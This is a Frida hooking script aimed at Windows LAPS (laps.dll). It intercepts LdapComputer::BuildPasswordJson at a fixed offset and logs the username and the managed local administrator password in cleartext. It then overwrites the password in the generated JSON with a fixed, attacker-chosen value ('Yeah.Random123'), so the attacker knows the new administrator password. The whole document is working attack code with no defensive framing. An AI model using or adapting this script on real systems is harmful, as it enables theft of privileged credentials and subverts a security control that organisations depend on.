const offset = 0x24a08; // Update me - offset to the target function

const moduleName = 'laps.dll';
const targetModule = Process.enumerateModules().find(mod => mod.name.toLowerCase().includes(moduleName.toLowerCase()));

if (targetModule !== undefined) {
    const baseAddr = targetModule.base;
    const targetFuncAddr = baseAddr.add(offset);
    console.log(`[+] Base address of ${moduleName}: ${baseAddr}`);   
    console.log(`[+] Hooking function at ${targetFuncAddr} (offset 0x${offset.toString(16)})`);

    Interceptor.attach(targetFuncAddr, {
        onEnter: function (args) {
            console.log('[SET] LdapComputer::BuildPasswordJson');
            
                    const username = args[1].readUtf16String();
                    const password = args[2].readUtf16String();
            
                    console.log(`--> Username (args[1]): ${username} / Password (args[2]): ${password}`);
            
                    this.arg4 = args[4];
        },
        onLeave: function (retval) {
            console.log('Leaving LdapComputer::BuildPasswordJson - Changing password');
            
                    if (retval == 0) {
                        try {
                            const ptr = this.arg4.readPointer();
                            const s = ptr.readUtf16String();
            
                            const key = '"p":"';
                            const start = s.indexOf(key);
                            if (start === -1) {
                                console.log(' --> Password key not found in JSON string.');
                                return;
                            }
            
                            const pwdStart = start + key.length;
                            const pwdEnd = s.indexOf('"', pwdStart);
                            if (pwdEnd === -1) {
                                console.log(' --> Closing quote for password not found.');
                                return;
                            }
            
                            const newPwd = 'Yeah.Random123';
                            const updatedString = s.substring(0, pwdStart) + newPwd + s.substring(pwdEnd);
            
                            console.log(`New password: ${newPwd}`);
                            console.log(`Updated JSON: ${updatedString}`);
            
                            ptr.writeUtf16String(updatedString);
                        } catch (err) {
                            console.log(` --> Error updating password: ${err.message}`);
                        }
                    }
        }
    });

} else {
    console.error(`[-] Could not find base address for ${moduleName}`);
}

